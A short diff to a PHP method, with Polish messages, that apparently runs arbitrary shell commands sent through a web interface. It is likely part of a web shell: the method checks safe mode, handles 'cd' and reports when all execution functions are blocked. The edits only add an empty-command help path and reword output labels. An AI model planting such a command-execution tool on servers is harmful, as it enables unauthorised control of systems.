@@ -79,11 +79,12 @@ DATA;
     {
         $sCmd = $this->oArgs->getRawData();
 
-        /**
-         * Jezeli safemode jest wylaczony
-         */
+        if (strlen(trim($sCmd)) == 0) {
+            return self::getHelp();
+        }
+
         if ($this->oUtils->isSafeMode()) {
-            return 'Safe mode jest włączone, funkcje systemowe nie działają !!!';
+            return 'Safe mode jest włączone, funkcje systemowe nie działają!';
         }
 
         if (strncmp($sCmd, 'cd ', 3) === 0) {
@@ -173,11 +174,10 @@ DATA;
             return 'Cannot execute command. All functions have been blocked!';
         }
 
-        $sData = "Command: '$sCmd'\r\nPHP function: " . ob_get_contents();
+        $sData = "Cmd: '$sCmd'\r\nPHPfunc: " . ob_get_contents();
         ob_clean();
         ob_end_flush();
 
         return htmlspecialchars($sData);
     }
-
 }
